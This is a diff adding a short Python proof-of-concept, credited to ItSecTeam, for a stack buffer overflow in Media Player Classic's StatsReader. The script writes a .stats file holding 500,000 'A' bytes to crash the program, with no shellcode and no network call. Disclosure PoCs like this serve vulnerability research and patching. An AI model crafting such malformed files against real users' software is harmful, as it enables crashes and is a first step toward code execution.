@@ -1,0 +1,30 @@
+#! /usr/bin/python
+#
+# #############################################################################
+# Media Player classic StatsReader (.stats file) stack buffer Overflow poc
+# Software Link: http://mpc-hc.sourceforge.net/download-media-player-classic-hc.html
+# Tested in : Windows XP SP3
+# Credit : ItSecTeam
+# mail : Bug@ItSecTeam.com
+# Web:  WwW.ITSecTeam.com
+# Found by: PLATEN @ ItSecTeam
+# Special Tanks : M3hr@n.S - B3hz4d - Cdef3nder
+# patch: C:\Program Files (x86)\K-Lite Codec Pack\Tools\StatsReader.exe
+#        Usage: ./stats-poc.py
+# #############################################################################
+#
+print """
+[~] Media Player clissic StatsReader (.stats file) stack buffer Overflow poc
+[~] mail : Bug@ItSecTeam.com
+[~] Web:  WwW.ITSecTeam.com
+[~] Find by: hoshang jafari a.k.a (PLATEN) @ ItSecTeam
+"""
+
+data= "\x41" *500000
+try:
+        file=open("media-poc.stats",'w')
+        file.write( data )
+        file.close()
+        print   ("[+] File created successfully: media-poc.stats" )
+except:
+        print "[-] Error cant write file to system\n"
